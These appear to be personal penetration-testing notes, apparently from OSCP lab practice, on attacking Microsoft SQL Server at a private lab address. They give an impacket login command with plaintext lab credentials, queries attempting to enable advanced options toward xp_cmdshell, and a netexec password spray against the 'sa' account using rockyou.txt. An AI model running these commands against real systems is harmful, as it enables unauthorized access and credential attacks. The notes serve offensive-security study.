# MSSQL
- TCP 1433
- Microsoft SQL Server
- 
## Connect
```bash
# Attempt sql connection to 10.10.158.142
impacket-mssqlclient Eric.Wallows:EricLikesRunning800@10.10.158.142  -windows-auth
# Success!
```
## SQL Query 
```bash

SELECT * FROM msdb.information_schema.tables;
EXECUTE sp_configure 'show advanced options', 1;
# we don't have permissions for XP_CMDSHELl

```
## Password Spray
```bash
# OSCP A - attempted password spray via MSSQL, failed
nxc mssql 10.10.158.142 --local-auth -u 'sa'  -p  /usr/share/wordlists/rockyou.txt  --ignore-pw-decoding
```